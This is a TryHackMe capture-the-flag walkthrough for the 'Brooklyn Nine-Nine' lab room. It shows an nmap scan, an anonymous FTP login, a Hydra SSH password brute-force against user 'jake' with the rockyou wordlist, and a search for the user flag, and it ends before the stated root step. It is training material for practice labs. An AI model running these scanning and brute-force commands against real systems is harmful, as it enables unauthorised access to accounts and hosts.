## 🧠 Brooklyn99 - TryHackMe Walkthrough

📅 **Date**: July 26, 2020

🔗 **Room Link**: [Brooklyn Nine-Nine - TryHackMe](https://tryhackme.com/room/brooklynninenine)

🎯 **Goal**: Gain user and root access; capture the flags.

---

### 🔍 Step 1: Initial Nmap Scan

Scan the target to see open ports and services:

```bash
bash

nmap <ip>

```

Example:

```bash
bash

nmap 10.10.10.123

```

### 📄 Observations:

- **Open Ports**: 21 (FTP), 22 (SSH), 80 (HTTP)
- **FTP**: Anonymous login enabled
- **FTP File**: `note_to_jake.txt`
- **Possible Usernames**: `jake`, `amy`, possibly `holt`

---

### 📁 Step 2: Anonymous FTP Login

Connect to the FTP server:

```bash
bash

ftp <ip>

```

Login details:

- **Username**: `anonymous`
- **Password**: *(just press Enter)*

Then:

```bash
bash

ls
get note_to_jake.txt

```

---

### 🔐 Step 3: Brute-Force Jake's SSH Password

Use Hydra with simple syntax:

```bash
bash

hydra -l jake -P <wordlist> ssh://<ip>

```

Example:

```bash
bash

hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.123

```

---

### 🧑‍💻 Step 4: SSH Access

Login using the credentials found from Hydra:

```bash
bash

ssh jake@<ip>

```

Example:

```bash
bash

ssh jake@10.10.150.247

```

---

### 🏁 Step 5: Find and Read User Flag

Search for the user flag:

```bash
bash

find / -name user.txt 2>/dev/null

```

Found:

```
arduino

/home/holt/user.txt

```

Read the flag:

```bash
bash

cat /home/holt/user.txt

```

✅ **Submit the flag**
